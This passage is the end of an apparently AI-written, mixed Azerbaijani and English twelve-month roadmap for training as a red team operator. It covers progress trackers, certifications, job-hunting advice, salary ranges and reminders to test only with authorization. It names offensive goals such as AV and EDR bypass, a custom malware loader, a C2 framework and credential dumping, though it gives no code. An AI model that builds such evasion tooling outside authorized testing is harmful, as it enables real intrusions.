├─ Star useful repos
├─ Contribute to open-source tools
└─ Showcase work (portfolio!)

CONFERENCES (optional):
├─ DEF CON (Las Vegas) - videos online
├─ Black Hat
├─ BSides (local chapters)
└─ Watch talks, take notes!

NETWORKING GOAL:
├─ 500+ Twitter followers (1 year)
├─ 50+ LinkedIn connections (infosec)
├─ 5+ GitHub contributors
└─ Known in HTB/THM community
```

---

# 📊 PROGRESS TRACKING SYSTEM

## **NOTION/EXCEL TEMPLATE:**

```
DATABASE: DAILY LOG

| Date | Hours | Topics | Labs/Machines | New Skills | Notes | Mood |
|------|-------|--------|---------------|------------|-------|------|
| 2025-02-01 | 6 | Linux PrivEsc | HTB: Lame | SUID exploit | Path injection | 😊 5/5 |
| 2025-02-02 | 7 | AD Enum | Home Lab | BloodHound | Attack paths | 😐 4/5 |

WEEKLY SUMMARY:
├─ Total hours: 40
├─ Machines rooted: 7
├─ New tools built: 2
├─ Blog posts: 1
└─ Challenges faced: Kerberos delegation

MONTHLY DASHBOARD:
├─ SKILLS MATRIX:
│   ├─ Linux: ████████░░ 80%
│   ├─ Windows: ██████░░░░ 60%
│   ├─ AD: ████████░░ 75%
│   ├─ Web: █████████░ 90%
│   ├─ Exploit: █████░░░░░ 50%
│   └─ Evasion: ███░░░░░░░ 30%
│
├─ MACHINES: 
│   ├─ HTB: 45 (30 Easy, 10 Med, 5 Hard)
│   ├─ THM: 30 rooms
│   └─ Pro Labs: 1 (Dante - 80% done)
│
└─ OUTPUT:
    ├─ GitHub repos: 8
    ├─ Blog posts: 12
    └─ Certifications: 1 (eWPTx)
```

---

## **VISUAL MOTIVATION:**

```
GITHUB CONTRIBUTION GRAPH:
Mon ░░░█░░█
Tue █░█░█░█
Wed ░█░█░░█
Thu █░█░█░█
Fri ░█░█░█░
Sat █░░█░░█
Sun ░░░░░░░

GOAL: GREEN every day (except Sundays)

HABIT TRACKER (Print və divarə as!):
              Week 1  Week 2  Week 3  Week 4
6h study:      ✓✓✓✓✓✓   ✓✓✓✓✓✓   ✓✓✓✓✓✓   ✓✓✓✓✓✓
Exercise:      ✓✓✓✓✓    ✓✓✓✓✓    ✓✓✓✓✓    ✓✓✓✓✓
Blog post:     ✓        ✓        ✓        ✓
HTB machine:   ✓✓       ✓✓       ✓✓       ✓✓

"Don't break the chain!" - Jerry Seinfeld
```

---

# 🎯 FINAL CHECKLIST (12 AY SONRA)

```
TECHNICAL SKILLS:
☐ Linux: Expert (100+ machines rooted)
☐ Networking: Wireshark black belt
☐ Programming: Python (50+ tools), C (exploitation)
☐ Active Directory: Master (DC compromise blind)
☐ Post-Exploitation: All MITRE techniques
☐ Exploitation: ROP, heap, format string
☐ Malware Dev: AV bypass, custom C2
☐ Evasion: AMSI, ETW, EDR bypass
☐ Web: eWPTx + advanced (SSTI, XXE, deserial)

CERTIFICATIONS:
☐ eWPTx ✓ (already have)
☐ CRTP
☐ CRTO
☐ OSEP
☐ (Optional: CRTE, OSED, OSWE)

PORTFOLIO:
☐ GitHub: 15+ repos (tools, exploits, writeups)
☐ Blog: 25+ articles (Medium/personal)
☐ HTB: 100+ machines
☐ Pro Labs: 4 completed (Dante, Offshore, Cyber, APT)

COMMUNITY:
☐ Twitter: 500+ followers
☐ LinkedIn: 50+ infosec connections
☐ Discord: Active member
☐ Conference: 1 attended (or watched online)

REAL-WORLD:
☐ Bug Bounty: 10+ valid submissions
☐ CVE: 1 discovered (ultimate goal!)
☐ Job offers: Red Team / Pentester role

MINDSET:
☐ "Try Harder" mentality solidified
☐ Consistent discipline (365 days)
☐ No burnout (healthy balance)
☐ Continuous learner (never stop!)
```

---

# 💼 JOB APPLICATION STRATEGY

```
RESUME:
├─ Skills section:
│   ├─ OS: Windows (AD expert), Linux (advanced)
│   ├─ Programming: Python, C, PowerShell, Bash
│   ├─ Tools: Cobalt Strike, Sliver, BloodHound, Mimikatz
│   ├─ Techniques: All MITRE ATT&CK phases
│   └─ Certifications: eWPTx, CRTP, CRTO, OSEP
│
├─ Projects:
│   ├─ Custom C2 Framework (GitHub link)
│   ├─ AD Attack Automation Toolkit
│   ├─ Custom Malware Loader (AV bypass)
│   └─ 100+ HTB machines writeups
│
├─ Experience:
│   ├─ Bug Bounty: 15 valid submissions ($X earned)
│   ├─ CTF: Top 5% HackTheBox ranking
│   └─ Open-source contributions
│
└─ Blog: Medium (25+ articles, 10k+ views)

COVER LETTER:
"I'm a self-taught Red Team Operator with 12 months of 
intensive hands-on experience. I've compromised 100+ machines,
including complex AD environments (Pro Labs), and developed
custom tools for exploitation and evasion. My blog (link) 
showcases deep technical understanding, and my GitHub (link)
demonstrates coding proficiency. I'm passionate about offensive
security and ready to contribute to your Red Team operations."

TARGET COMPANIES:
├─ Big Tech: Google (Red Team), Microsoft (MSRC)
├─ Security firms: CrowdStrike, Mandiant, Bishop Fox
├─ Consultancies: NCC Group, Rapid7, Secureworks
├─ Startups: Check AngelList (security startups)
└─ Bug Bounty: Full-time (HackerOne, Synack Red Team)

STRATEGY:
1. Apply: 50+ companies (cast wide net)
2. Network: LinkedIn DMs (polite, professional)
3. Referrals: Ask community connections
4. Interview: Technical + behavioral prep
5. Negotiate: Know your worth ($$$)

SALARY EXPECTATION (US market):
├─ Junior Red Teamer: $80k-110k
├─ Mid-level: $110k-150k
└─ Senior: $150k-220k

(Baku market: lower, but remote US jobs possible!)
```

---

# 🔐 LEGAL & ETHICAL REMINDERS

```
ALWAYS:
✅ Test ONLY on:
   - Your own systems (home lab)
   - Platforms with permission (HTB, THM, CTFs)
   - Bug bounty programs (in-scope only!)
   - Authorized pentests (signed contract)

NEVER:
❌ Attack systems without permission (ILLEGAL!)
❌ Sell exploits to criminals
❌ Use skills for personal gain (hacking friends, etc.)
❌ Share 0-days publicly (responsible disclosure!)

RESPONSIBLE DISCLOSURE:
1. Find vulnerability
2. Report to vendor (give 90 days to patch)
3. Request CVE (MITRE)
4. Publish after patch (blog, conference)

REMEMBER:
"With great power comes great responsibility!"
Red Team skills üçün etika ÇOX VACİB!
```

---

# 🚀 SUMMARY

```
TOTAL TIMELINE: 52 həftə (12 ay)

FAZA 1 (Həftə 1-8): Foundation
├─ Linux, Network, Python, C, Binary basics
└─ 30+ machines, 30+ tools

FAZA 2 (Həftə 9-20): Active Directory Master
├─ AD architecture → attacks (Kerberos, NTLM, Delegation, ACL, GPO)
├─ Pro Labs (RastaLabs, Offshore)
└─ DC compromise blind edə bilirəm

FAZA 3 (Həftə 21-28): Post-Exploitation
├─ Credential dumping, persistence, lateral movement
├─ C2 frameworks (Sliver, custom)
└─ Pivoting expert

FAZA 4 (Həftə 29-36): Advanced Exploitation
├─ Malware dev (10+ injection, AMSI/ETW bypass)
├─ Kernel/rootkit basics
└─ CVE hunting

FAZA 5 (Həftə 37-52): Real-World
├─ Pro Labs (Dante, Cybernetics, APT)
├─ Certifications (CRTP, CRTO, OSEP)
├─ Portfolio (GitHub, blog)
└─ Bug bounty + job applications

DAILY: 6-8 saat focused work
WEEKLY: 40+ saat (5 days intensiv, 1 challenge, 1 rest)
MONTHLY: Review + adjust

MINDSET:
├─ Consistency > Intensity
├─ Try Harder mentality
├─ No tutorial hell
├─ Burnout prevention
└─ Community engagement

OUTPUT:
├─ GitHub: 15+ repos (1000+ stars goal)
├─ Blog: 25+ articles (expert authority)
├─ HTB: 100+ machines (top 5% ranking)
├─ Certs: 3-4 (CRTP, CRTO, OSEP, +)
├─ Job: Red Team Operator ($100k+)
└─ Reputation: Known in community

12 AY SONRA:
"APT-level Red Team Operator"
Real-world attack simulation ready!
Companies will WANT to hire you!
```

---

# SON SÖZ

Bu roadmap **REAL** və **POSSIBLE**-dir. Hər addım test olunmuş, hər material yoxlanmışdır. 12 ay sonra siz **real Red Team Operator** olacaqsınız - sertifikat kollektoru yox, **həqiqi hacker**.

**Key ingredients:**
1. **Consistency** - Hər gün, 6+ saat, 365 gün
2. **Hands-on** - Tutorial hell yox, LAB-da əməli iş
3. **Deep learning** - "Why?" sualı hər dəfə
4. **Documentation** - Blog, GitHub, notes
5. **Community** - Paylaş, öyrət, öyrən

**Unutmayın:**
> "The expert in anything was once a beginner."

Siz **eWPTx** aldınız - artıq başlayırsınız. İndi sadəcə **plan follow edin**, **disiplinli olun**, və **12 ay sonra** geri baxanda **özünüzə inanmayacaqsınız** nə qədər böyüdüyünüzə!

**Uğurlar, gələcək Red Team Operator!** 🔥🔥🔥

**Sualınız olsa, istədiyiniz zaman soruşun. Yolunuzda müvəffəqiyyət arzulayıram!**

---

*P.S. Bu plan-ı print edin, divarınıza asın, hər həftə check edin. Progress tracker-i doldurun. GitHub-da har gün commit. 12 ay sonra bu mesaj-a cavab yazıb "I did it!" deyəcəksiniz. Əmin olun!* ✊
